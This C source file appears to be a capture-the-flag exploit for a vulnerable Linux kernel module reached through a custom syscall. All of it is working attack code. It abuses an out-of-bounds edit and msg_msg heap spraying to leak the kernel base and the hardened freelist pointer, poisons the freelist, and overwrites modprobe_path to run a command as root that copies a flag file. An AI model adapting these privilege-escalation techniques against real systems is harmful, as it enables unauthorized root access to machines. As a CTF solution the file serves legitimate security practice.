#include "libx.h"
#define ISP 548
typedef struct {
  int idx;
  unsigned short priority;
  char *data;} dt;
void add(char *buf, int priority){
    dt dt;
    dt.priority = priority;
    dt.data = buf;
    return syscall(ISP,1,&dt);
}
void del(int idx){
    dt dt;
    dt.idx = idx;
    return syscall(ISP,2,&dt);
}
void edit(int idx, char *buf){
    dt dt;
    dt.idx = idx;
    dt.data = buf;
    return syscall(ISP,3,&dt);

}
void copy(int idx){
    dt dt;
    dt.idx = idx;
    return syscall(ISP,4,&dt);
}
int main()
{   
    char *atk = malloc(0x1000);
    memset(atk,'\1',0x1000);
    size_t *hook = &atk[0xfd0];
    char *ctx = calloc(1,0x1000);

    
    for(int i= 0 ; i< 0x10;i++)
    {
        memcpy(ctx,dp('i',10),10);
        add(ctx,0x1000+i);
    }
        
    copy(0);
    del(0);
    int msgid1 = msgGet();
    int msgid2 = msgGet();
    msgSend(msgid1,"Wat",0x50);
    
    edit(-1,strcat(dpn('\xff',10,18),p64(0x2024)));
    msgMsg* msg = msgRecv(msgid1,0x1000);
    msgSend(msgid2,"Wat",0x50); // Refil
    edit(-1,strcat(dpn('\xff',10,18),p64(0x2024)));
    char *msg_ctx = msg->mtext;
    

    struct memIPS{
        size_t next;
        size_t offset;
        size_t found;
    } mem[0x10];
    memset(mem,0,sizeof(mem));
    size_t kernel_text = 0;
    for(int i =0 ;i<0x200-2;i++){
        int idx = i+1;
        size_t value = *(size_t *)(&msg_ctx[idx*8]);
        // info(value);
        if(value==0x6969696969696969){
            size_t meta = *(size_t *)(&msg_ctx[i*8]);
            size_t ips_idx = (meta&0xff);
            mem[ips_idx].offset = i*8-8+0x30;
            mem[ips_idx].next = *(size_t *)(&msg_ctx[i*8-8]);
            mem[ips_idx].found = 1;
        }
        if((value&0xfff)==0x9a0){
            kernel_text = value;
        }

    }
    if(kernel_text==0)
        panic("[!] Can't Leak Kernel Text");
    else
        kernel_text -= 0x16429a0;
    
    size_t victim_addr  = 0;
    size_t leaker       = 0;
    size_t offFreelist= 0;
    
    for(int i=0;i<0x10;i++){
        if(mem[i].found == 1 && mem[i+1].found==1){            
            victim_addr = mem[i].next-mem[i+1].offset+mem[i].offset;
            leaker = mem[i].next+0x40;
            del(i);  // Free mem[i]
            del(i+1);// Free mem[i+1]
            offFreelist = mem[i+1].offset;
            break;
        }
    }
    if(offFreelist==0)
        panic("[!] Not able to find IPS objects.");
    
    msgid1 = msgGet();
    msg = msgRecv(msgid2,0x1000);
    msgSend(msgid1,"Wat",0x50); // Refil
    size_t  *leakedFd= msg->mtext+offFreelist+0x10;
    size_t magic = (*leakedFd)^(victim_addr)^(swab(leaker)); //Leak Magic
    info(magic);
    size_t modprobe = 0x144fa20+kernel_text;
    info(kernel_text);
    edit(-1,strcat(dpn('\xff',18,18+8),p64(leaker-0x40+0x10)));
    msgid2 = msgGet();
    msg = msgRecv(msgid1,1);
    msgSend(msgid2,strcat(dpn('\xff',0xfd0+0x28,0xfd0+0x78),p64(magic^swab(leaker)^(modprobe-0x10))),0xfd0+0x78);
    add(ctx,1);
    add(ctx,2);
    add(strcat(dpn('\xff',0x2,0x60),"/home/user/n132"),3);
    modprobeAtk("/home/user/","cat /flag > /n132");
    system("cat /n132");
}